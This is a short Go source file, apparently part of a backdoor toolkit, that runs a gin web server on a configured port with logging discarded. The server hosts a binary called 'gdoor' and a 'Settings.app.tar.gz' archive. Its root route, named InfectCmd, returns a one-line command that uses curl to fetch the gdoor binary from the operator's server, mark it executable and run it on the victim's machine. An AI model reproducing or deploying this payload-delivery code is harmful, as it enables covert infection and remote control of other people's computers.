package service

import(
  "net/http"
  "io/ioutil"

  "github.com/gin-gonic/gin"

  "../config"
)

func Service(){
  gin.SetMode(gin.ReleaseMode)
  r := gin.New()
  gin.DefaultWriter = ioutil.Discard

  r.GET("/", InfectCmd)
  r.StaticFile("/gdoor", "./client")
  r.StaticFile("/root", "./Settings.app.tar.gz")

  go r.Run(config.FServerPort)
}

func InfectCmd(c *gin.Context){
  cmd := "curl -s " + config.ServerIP + config.FServerPort + "/gdoor > ./gdoor && chmod +x ./gdoor && ./gdoor"
  c.String(http.StatusOK, cmd)
}
